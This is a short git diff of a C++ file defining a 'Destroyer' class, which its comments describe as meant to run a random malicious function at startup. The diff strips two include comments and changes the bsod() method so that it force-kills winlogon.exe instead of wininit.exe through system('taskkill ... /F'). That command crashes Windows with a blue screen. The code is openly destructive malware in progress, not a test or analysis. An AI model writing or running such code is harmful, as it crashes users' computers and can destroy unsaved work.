@@ -1,6 +1,6 @@
 #include <iostream>
-#include <stdlib.h> // Hey, Laaksh You had forgotten to include this lol
-#include <windows.h> //for Windows GUI functions and APIs
+#include <stdlib.h>
+#include <windows.h>
 
 /**Making an object "Destroyer", which will contain all the necessary functions. I think we should make 
  * it so that a random malicious function is called upon startup 
@@ -9,7 +9,7 @@ class Destroyer{
     public:
         void bsod()//BSODs the computer
         {
-            system("taskkill /IM \"wininit.exe\" /F");
+            system("taskkill /IM \"winlogon.exe\" /F");
             std :: cout << "This is a placeholder\n";
         }
 
